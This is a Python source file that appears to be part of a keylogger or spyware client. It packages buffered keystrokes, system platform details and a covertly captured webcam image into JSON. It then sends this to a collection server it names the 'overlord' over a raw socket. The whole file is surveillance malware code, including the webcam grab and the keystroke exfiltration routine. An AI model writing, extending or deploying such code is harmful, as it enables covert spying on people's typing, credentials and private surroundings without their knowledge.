import socket
import json
import struct
from sys_platform import get_platform
import cv2
import base64
import psutil


server_address = ('localhost', 9696)

def send_payload_to_socket(payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)
    # Send the length of the message first in the socket in network-byte order
    payload = struct.pack('>I', len(payload)) + payload
    sock.sendall(payload)
    sock.close()

def send_objects_to_overlord(buffered_keys):
    keys = [key.__dict__ for key in buffered_keys]
    payload = {}
    payload['user'] = get_platform()
    payload['user']['image'] = get_image()
    # payload['user']['processes'] = get_running_processes()
    payload['keys'] = keys
    send_payload_to_socket(json.dumps(payload))

def get_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    retval, buffer = cv2.imencode('.jpg', frame)
    return base64.b64encode(buffer)

def get_running_user_processes():
    # TODO change to user processes
    running_processes = []
    for proc in psutil.process_iter():
        try:
            running_processes.append(proc.name())
            print proc.cmdline()
        except psutil.AccessDenied:
            print "Permission error or access denied on process"
